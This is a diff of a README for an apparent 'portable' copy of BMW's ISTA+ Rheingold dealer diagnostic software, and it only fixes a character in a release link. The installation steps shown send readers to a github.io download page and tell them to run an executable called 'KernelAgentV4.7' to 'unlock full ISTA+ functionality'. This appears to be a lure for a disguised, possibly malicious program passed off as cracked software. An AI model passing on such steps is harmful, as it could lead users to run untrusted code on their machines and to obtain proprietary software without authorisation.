@@ -10,7 +10,7 @@ Run full dealer-grade diagnostics, ECU access, and service functions on BMW, MIN
 ### ⚙️ Installation Instructions
 
 1. 📦 **Download the archive** from the [Releases](https://bmw-ista-plus-rheingold-portable.github.io/.github
-E) section  
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `D:\BMWTools\ISTA`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 This will unlock full ISTA+ functionality and interface compatibility  
